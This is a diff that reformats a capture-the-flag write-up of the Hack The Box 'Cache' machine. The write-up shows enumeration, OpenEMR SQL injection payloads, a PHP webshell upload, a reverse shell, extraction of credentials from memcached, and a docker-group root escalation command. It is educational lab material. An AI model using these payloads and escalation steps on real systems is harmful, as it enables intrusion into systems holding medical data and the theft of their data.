@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/aab762b6f58ec6a8054afda8a22e5b72298ba5ec/linux-machines/medium/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,18 +10,17 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
 ### Nmap scan
 
-
-```
+```text
 zweilos@kali:~/htb/cache$ nmap -p- -sC -sV -oN cache.nmap 10.10.10.188
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 11:32 EDT
 Nmap scan report for 10.10.10.188
@@ -42,16 +41,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds
 ```
 
-
 I started my enumeration with an nmap scan of `10.10.10.188`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
-http://10.10.10.188/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E#
+[http://10.10.10.188/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E\#](http://10.10.10.188/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E#)
 
 message submission results in url
 
-### nikto 
+### nikto
 
-```
+```text
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.188
@@ -74,9 +72,10 @@ message submission results in url
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-login.html seems to be rabbit hole.  Never attempts to actually send data. bypassing the page by loading `net.html` seen in the source leads to "under construction" page.  
 
-```
+login.html seems to be rabbit hole. Never attempts to actually send data. bypassing the page by loading `net.html` seen in the source leads to "under construction" page.
+
+```text
 HTTP/1.1 200 OK
 Date: Sun, 09 Aug 2020 16:12:49 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -91,15 +90,15 @@ Content-Type: text/html
 <html>
 <head>
  <body onload="if (document.referrer == '') self.location='login.html';">   
-	<style>
+    <style>
 body  {
   background-color: #cccccc;
 }
 </style>
 </head>
 <center>
-	<h1> Welcome Back!</h1>
-	<img src="4202252.jpg">
+    <h1> Welcome Back!</h1>
+    <img src="4202252.jpg">
 
 
 <h1>This page is still underconstruction</h1>
@@ -108,12 +107,11 @@ body  {
 </html>
 ```
 
-found some credentials in the `functionality.js` file in the `/jquery` folder. `ash:H@v3_fun` This enabled me to login to the site, which I had already discovered to hold nothing useful.  This password did not work for logging into SSH.  I decided to try to use my `cewl` wordlist to see if I could enumerate a proper password now that I had a username.
-
+found some credentials in the `functionality.js` file in the `/jquery` folder. `ash:H@v3_fun` This enabled me to login to the site, which I had already discovered to hold nothing useful. This password did not work for logging into SSH. I decided to try to use my `cewl` wordlist to see if I could enumerate a proper password now that I had a username.
 
 Next I tried enumerating subdomains using virtual host enumeration as described in the HTB machine [Forwardslash](https://zweilosec.gitbook.io/htb-writeups/linux-machines/hard/forwardslash-write-up#virtual-host-enumeration)
 
-```
+```text
 zweilos@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ===============================================================
 Gobuster v3.0.1
@@ -148,8 +146,10 @@ Found: sklep_test.cache.htb (Status: 400) [Size: 422]
 2020/08/09 15:06:19 Finished
 ===============================================================
 ```
-I wasn't sure if any of these were useful (or reachable, rather) so I loaded up another wordlist to try again.
-```
+
+I wasn't sure if any of these were useful \(or reachable, rather\) so I loaded up another wordlist to try again.
+
+```text
 zweilos@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/
 bitquark-subdomains-top100000.txt                 shubs-stackoverflow.txt
 deepmagic.com-prefixes-top50000.txt               shubs-subdomains.txt
@@ -177,7 +177,8 @@ Found: www_.cache.htb (Status: 400) [Size: 422]
 2020/08/09 15:13:15 Finished
 ===============================================================
 ```
-```
+
+```text
 zweilos@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
 ===============================================================
 Gobuster v3.0.1
@@ -196,8 +197,10 @@ Found: *.cache.htb (Status: 400) [Size: 422]
 2020/08/09 15:22:01 Finished
 ===============================================================
 ```
-All of these 400 errors were somwhat promising since those sites seem to exist but my requests to them arent correct.  
-```
+
+All of these 400 errors were somwhat promising since those sites seem to exist but my requests to them arent correct.
+
+```text
 zweilos@kali:~/htb/cache$ wfuzz --hh 8193 -w /home/zweilos/htb/cache/cache.cewl -H "Host: FUZZ.htb" http://10.10.10.188
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -223,38 +226,33 @@ Filtered Requests: 1216
 Requests/sec.: 190.7288
 ```
 
-`--hh 8193` filters out replies that are 8193 chars long, which was what it replied for pretty much everything, even if it didn't exist.  
+`--hh 8193` filters out replies that are 8193 chars long, which was what it replied for pretty much everything, even if it didn't exist.
 
-add to hosts
-navigating to `http://hms.htb` redirects to a login page at `http://hms.htb/interface/login/login.php?site=default`  the creds from the previous site do not work here
+add to hosts navigating to `http://hms.htb` redirects to a login page at `http://hms.htb/interface/login/login.php?site=default` the creds from the previous site do not work here
 
-https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69
-download script from https://github.com/musyoka101/OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit/blob/master/openemr_exploit.py
+[https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69](https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69) download script from [https://github.com/musyoka101/OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit/blob/master/openemr\_exploit.py](https://github.com/musyoka101/OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit/blob/master/openemr_exploit.py)
 
-https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting#Arbitrary
+[https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting\#Arbitrary](https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting#Arbitrary)
 
-ran dirbuster: shows admin.php which shows the version of this site. (5.0.1(3)) Searching for a vulnerability for this site leads to CVE-2019-8371 https://www.cvedetails.com/cve/CVE-2019-8371/
-There is also a vulnerability report that I found that deals with this specific version (5.0.1.3). 
-https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf This report details
-`admin.php`=unauthenticated user will be prompted with the database name, the site ID as well as the current version of OpenEMR.
+ran dirbuster: shows admin.php which shows the version of this site. \(5.0.1\(3\)\) Searching for a vulnerability for this site leads to CVE-2019-8371 [https://www.cvedetails.com/cve/CVE-2019-8371/](https://www.cvedetails.com/cve/CVE-2019-8371/) There is also a vulnerability report that I found that deals with this specific version \(5.0.1.3\). [https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) This report details `admin.php`=unauthenticated user will be prompted with the database name, the site ID as well as the current version of OpenEMR.
 
-`sql_patch.php`=reveals current patch level "OpenEMR Version = 5.0.1(3)"
+`sql_patch.php`=reveals current patch level "OpenEMR Version = 5.0.1\(3\)"
 
-Since the patient portal didnt seem to reveal any useful information, I moved on to the next section, SQL injection. The first example sounded interesting, because combined with the patient portal bypass, I could use the authenticated SQLi vulnerability.  
+Since the patient portal didnt seem to reveal any useful information, I moved on to the next section, SQL injection. The first example sounded interesting, because combined with the patient portal bypass, I could use the authenticated SQLi vulnerability.
 
-```
+```text
 http://hms.htb/portal/find_appt_popup_user.php?catid=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -
+```
 
-```
-```
+```text
 /portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))
 ```
-system_user() gets openemr@localhost
-database() gets openemr
+
+system\_user\(\) gets openemr@localhost database\(\) gets openemr
 
 using `sqldump` on database `openemr` gets crapton of tables...
 
-```
+```text
 Database: openemr                                                                                      
 [234 tables]
 +---------------------------------------+
@@ -494,12 +492,14 @@ Database: openemr
 | x12_partners                          |
 +---------------------------------------+
 ```
-Next I dumped the user_secure table because that sounded quite promising.  I also tried dumping other interesting sounding tables such as `notes` and `users_facility` but they were empty.
+
+Next I dumped the user\_secure table because that sounded quite promising. I also tried dumping other interesting sounding tables such as `notes` and `users_facility` but they were empty.
 
 insert table data
 
 The table contained information about a `openemr_admin` user, including a bcrypt hashed password. I loaded the hash into hashcat and it cracked almost imediately.
-```
+
+```text
 zweilos@kali:~/htb/cache/results/10.10.10.188/scans$ hashcat -m 3200 -a 0 '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' /home/zweilos/rockyou_utf8.txt 
 hashcat (v6.0.0) starting...
 
@@ -521,7 +521,7 @@ Dictionary cache hit:
 * Keyspace..: 14344373
 
 $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: bcrypt $2*$, Blowfish (Unix)
@@ -541,32 +541,37 @@ Candidates.#1....: michelle1 -> felipe
 Started: Mon Aug 10 09:35:21 2020
 Stopped: Mon Aug 10 09:35:25 2020
 ```
-This was one lazy admin.  The password was `xxxxxx`.
+
+This was one lazy admin. The password was `xxxxxx`.
 
 can edit files in `/var/www/hms.htb/public_html/sites/default`
 
 according to pdf can read and write arbitrary files on the filesystem with:
-- `mode=get&docid=/etc/passwd`
-- `mode=save&docid=rce.php&content=<?php phpinfo();?>`
-on the page `/portal/import_template.php`
 
-Got `/etc/passwd`, can see that `luffy`, `ash`, and `root` are the only users that can log in. Played around with running commands with a simple shell, then remembered that I had downloaded a python exploit that required authentication to the portal to work.
-`mode=save&docid=rce.php&content=<?php system($_GET["evil"]); ?>`
+* `mode=get&docid=/etc/passwd`
+* `mode=save&docid=rce.php&content=<?php phpinfo();?>`
 
-Now that I had valid credentials to the portal, I could use exploit.py from earlier POC - modified a bit to work in this situation.  After taking a bit to upload the file, a shell was rerutned to me
+  on the page `/portal/import_template.php`
 
+Got `/etc/passwd`, can see that `luffy`, `ash`, and `root` are the only users that can log in. Played around with running commands with a simple shell, then remembered that I had downloaded a python exploit that required authentication to the portal to work. `mode=save&docid=rce.php&content=<?php system($_GET["evil"]); ?>`
+
+Now that I had valid credentials to the portal, I could use exploit.py from earlier POC - modified a bit to work in this situation. After taking a bit to upload the file, a shell was rerutned to me
 
 ## Initial Foothold
+
 ran the exploit
-```
+
+```text
 zweilos@kali:~/htb/cache$ vim exploit.py 
 zweilos@kali:~/htb/cache$ python3 ./exploit.py 
 [+] Authentication with credentials provided please be patient
 [+] Uploading a payload it will take a minute
 [+] You should be getting a shell
 ```
+
 then in my other terminal
-```
+
+```text
 zweilos@kali:~/htb/cache/results/10.10.10.188/scans$ nc -lvnp 12346
 listening on [any] 12346 ...
 connect to [10.10.15.57] from (UNKNOWN) [10.10.10.188] 34384
@@ -591,30 +596,34 @@ www-data@cache:/$ clear
 ```
 
 ## Road to User
-already had `ash` password `
-```
+
+already had `ash` password \`
+
+```text
 www-data@cache:/dev/shm$ su ash
 Password: 
 ash@cache:/dev/shm$
 ```
+
 ### Further enumeration
 
 ### Finding user creds
 
-
 ### User.txt
-```
+
+```text
 ash@cache:/dev/shm$ cat ~/user.txt
 d12352c0b83c09a8a46159db535b2776
 ```
+
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User <username>
-in `sql/official_additional_users.sql`
-phimail-service
-portal-user
+### Enumeration as User
+
+in `sql/official_additional_users.sql` phimail-service portal-user
 
 /sites/default/sqlconf.php
+
 ```php
 <?php
 //  OpenEMR
@@ -653,14 +662,13 @@ $config = 1; /////////////
 
 linpeas
 
-$2y$04$usesomesillystringfore7hnbRJHxXVLeakoG8K30oukPsA.ztMG = bcrypt hash for "password"
-bcb04b7e103a0cd8b54763051cef08bc55abe029fdebae5e1d417e2ffb2a00a3
+$2y$04$usesomesillystringfore7hnbRJHxXVLeakoG8K30oukPsA.ztMG = bcrypt hash for "password" bcb04b7e103a0cd8b54763051cef08bc55abe029fdebae5e1d417e2ffb2a00a3
 
-in file: /var/www/hms.htb/public_html/custom/export_labworks.php found `openemr:secret` creds for ftp
-
+in file: /var/www/hms.htb/public\_html/custom/export\_labworks.php found `openemr:secret` creds for ftp
 
 there is docker running on ip 172.17.0.1
-```
+
+```text
 ash@cache:/dev/shm$ ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -681,20 +689,20 @@ ash@cache:/dev/shm$ ip a
     inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
        valid_lft forever preferred_lft forever
 ```
-/var/www/hms.htb/public_html/docker-compose.yml
-contains info about all the different databases: root password = root; couchdb = admin:password
+
+/var/www/hms.htb/public\_html/docker-compose.yml contains info about all the different databases: root password = root; couchdb = admin:password
+
 ### Getting a shell
-```
+
+```text
 memcache   959  0.0  0.1 425792  4168 ?        Ssl  13:01   0:03 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
 ```
-Saw memcached in running processes with `ps aux`. didn't have much experience with it before so I started doing some reading to see if there were any privesc routes by using it. It was running on default port 11211. *It also stuck out a bit to me because of the `cache` theme on the box!*
 
-https://book.hacktricks.xyz/pentesting/11211-memcache
-memcached
-ash@cache:/dev/shm$ echo "version" | nc -vn 127.0.0.1 11211
-Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
-VERSION 1.5.6 Ubuntu
-```
+Saw memcached in running processes with `ps aux`. didn't have much experience with it before so I started doing some reading to see if there were any privesc routes by using it. It was running on default port 11211. _It also stuck out a bit to me because of the `cache` theme on the box!_
+
+[https://book.hacktricks.xyz/pentesting/11211-memcache](https://book.hacktricks.xyz/pentesting/11211-memcache) memcached ash@cache:/dev/shm$ echo "version" \| nc -vn 127.0.0.1 11211 Connection to 127.0.0.1 11211 port \[tcp/\*\] succeeded! VERSION 1.5.6 Ubuntu
+
+```text
 ash@cache:/dev/shm$ echo "stats" | nc -vn 127.0.0.1 11211
 Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
 STAT pid 959
@@ -778,7 +786,8 @@ STAT direct_reclaims 0
 STAT lru_bumps_dropped 0
 END
 ```
-```
+
+```text
 ash@cache:/dev/shm$ echo "stats slabs" | nc -vn 127.0.0.1 11211
 Connection to 127.0.0.1 11211 port [tcp/*] succeeded!
 STAT 1:chunk_size 96
@@ -810,12 +819,12 @@ ITEM account [9 b; 0 s]
 END
 ^C
 ```
-echoing a command to the service running seemed a bit awkward, so I tried running the command like `memcached stats`.  It seemed to be doing something, but waited for a long time.  I did some more reading and found that you could use telnet to interact with it.  *(I should have tried that on my own...if nc can interact then ssh and telnet should be able to...)*
 
-https://niiconsulting.com/checkmate/2013/05/memcache-exploit/
-https://www.hackingarticles.in/penetration-testing-on-memcached-server/
-```
+echoing a command to the service running seemed a bit awkward, so I tried running the command like `memcached stats`. It seemed to be doing something, but waited for a long time. I did some more reading and found that you could use telnet to interact with it. _\(I should have tried that on my own...if nc can interact then ssh and telnet should be able to...\)_
 
+[https://niiconsulting.com/checkmate/2013/05/memcache-exploit/](https://niiconsulting.com/checkmate/2013/05/memcache-exploit/) [https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)
+
+```text
 ash@cache:/dev/shm$ telnet 127.0.0.1 11211
 Trying 127.0.0.1...
 Connected to 127.0.0.1.
@@ -848,38 +857,41 @@ VALUE account 0 9
 afhj556uo
 END
 ```
+
 using `luffy:0n3_p1ec3` was able to ssh in as `luffy`!
 
 ## Enumeration as `luffy`
-```
+
+```text
 luffy@cache:/dev/shm$ id
 uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
 ```
-Hmm docker...I saw that running on 172.17.0.1 earlier but wasnt able to connect.  Using luffy's creds however I was able to SSH in to the docker container. confusingly...the docker container was also named `cache` so at first it looked like I had just logged back into the same machine.
 
-https://gtfobins.github.io/gtfobins/docker/
->This requires the user to be privileged enough to run docker, i.e. being in the docker group 
->`docker run -v /:/mnt --rm -it --privileged alpine chroot /mnt sh`
-from the man page
+Hmm docker...I saw that running on 172.17.0.1 earlier but wasnt able to connect. Using luffy's creds however I was able to SSH in to the docker container. confusingly...the docker container was also named `cache` so at first it looked like I had just logged back into the same machine.
 
-- Usage:  docker run [OPTIONS] IMAGE [COMMAND] [ARG...]
-- -i, --interactive                    Keep STDIN open even if not attached
-- -t, --tty                            Allocate a pseudo-TTY
-- -v, --volume list                    Bind mount a volume
-- --rm                             Automatically remove the container when it exits
+[https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)
 
-https://docs.docker.com/engine/reference/commandline/
+> This requires the user to be privileged enough to run docker, i.e. being in the docker group `docker run -v /:/mnt --rm -it --privileged alpine chroot /mnt sh` from the man page
 
-```
+* Usage:  docker run \[OPTIONS\] IMAGE \[COMMAND\] \[ARG...\]
+* -i, --interactive                    Keep STDIN open even if not attached
+* -t, --tty                            Allocate a pseudo-TTY
+* -v, --volume list                    Bind mount a volume
+* --rm                             Automatically remove the container when it exits
+
+[https://docs.docker.com/engine/reference/commandline/](https://docs.docker.com/engine/reference/commandline/)
+
+```text
 luffy@cache:~$ docker images
 REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
 ubuntu              latest              2ca708c1c9cc        10 months ago       64.2MB
 ```
-None of the pages I looked at explained the 'alpine' part of the command, but it looked like the name of the docker image.  after trying `cache` and getting an error, I looked in the man page for how to get the image name and came up with `docker images`. The name of this docker container was `2ca708c1c9cc`. Now I could run my command to escalate to root. `docker run -v /:/mnt --rm -it --privileged 2ca708c1c9cc chroot /mnt sh`
 
+None of the pages I looked at explained the 'alpine' part of the command, but it looked like the name of the docker image. after trying `cache` and getting an error, I looked in the man page for how to get the image name and came up with `docker images`. The name of this docker container was `2ca708c1c9cc`. Now I could run my command to escalate to root. `docker run -v /:/mnt --rm -it --privileged 2ca708c1c9cc chroot /mnt sh`
 
 ### Root.txt
-```
+
+```text
 luffy@cache:~$ docker run -v /:/mnt --rm -it --privileged 2ca708c1c9cc chroot /mnt sh
 
 # id &&hostname
@@ -892,3 +904,4 @@ uid=0(root) gid=0(root) groups=0(root)
 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
